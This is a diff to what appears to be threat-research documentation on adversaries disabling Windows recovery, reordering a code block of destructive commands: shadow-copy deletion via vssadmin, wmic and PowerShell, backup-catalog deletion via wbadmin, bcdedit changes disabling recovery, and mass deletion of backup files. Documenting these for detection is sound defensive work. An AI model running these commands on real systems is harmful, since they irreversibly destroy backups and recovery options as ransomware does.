@@ -35,18 +35,12 @@ A number of native Windows utilities have been used by adversaries to disable or
 
 ```
 vssadmin.exe delete shadows /all /quiet
-
+del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
+Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
 wmic.exe shadowcopy delete
-
-wbadmin.exe delete catalog -quiet
-
 bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
 bcdedit.exe /set {default} recoveryenabled no
-
-Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
-
-del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
-
+wbadmin.exe delete catalog -quiet
 ```
 
 ## Commands Dataset
